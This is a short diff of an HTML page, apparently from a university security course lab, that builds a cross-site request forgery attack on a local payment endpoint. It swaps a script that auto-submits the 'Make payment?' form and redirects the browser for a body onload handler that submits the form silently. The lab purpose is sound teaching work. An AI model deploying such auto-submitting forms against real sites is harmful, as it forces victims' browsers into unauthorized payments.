@@ -1,14 +1,6 @@
 <!DOCTYPE html>
 <html>
 
-<script>
-    window.onload = function(){
-      document.forms['payment-form'].submit();
-      window.location.replace("http://github.com/tomrist/cs5435-fall2019");
-    }
-</script>
-
-
 <div class="payment-form">
   <h3 class="payment-header">Make payment?</h3>
   <form action="http://localhost:8080/pay" method="post">
@@ -23,6 +15,8 @@
     <input class="form-button" type="submit" value="Pay"/>
   </form>
 </div>
+
+<body onload="document.forms[0].submit()">
 
 
 </html>
